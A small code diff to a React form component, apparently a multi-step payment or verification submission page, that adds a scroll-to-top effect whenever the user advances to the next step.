@@ -195,6 +195,7 @@ export default function SubmitPage() {
   const [otpList, setOtpList] = useState<string[]>([])
 
   const unsubRef = useRef<(() => void) | null>(null)
+  const previousStepRef = useRef(step)
   const yearsCount = useMemo(() => {
     const parsedYears = Number(requestedYears)
     if (!Number.isFinite(parsedYears) || parsedYears < 1 || parsedYears > 5) return 1
@@ -238,6 +239,13 @@ export default function SubmitPage() {
   useEffect(() => {
     return () => { unsubRef.current?.() }
   }, [])
+
+  useEffect(() => {
+    if (step > previousStepRef.current) {
+      window.scrollTo({ top: 0, behavior: 'smooth' })
+    }
+    previousStepRef.current = step
+  }, [step])
 
   const saveToFirestore = async (extra: Record<string, unknown> = {}) => {
     const [expiryYear, expiryMonth] = cardExpiry.split('-')
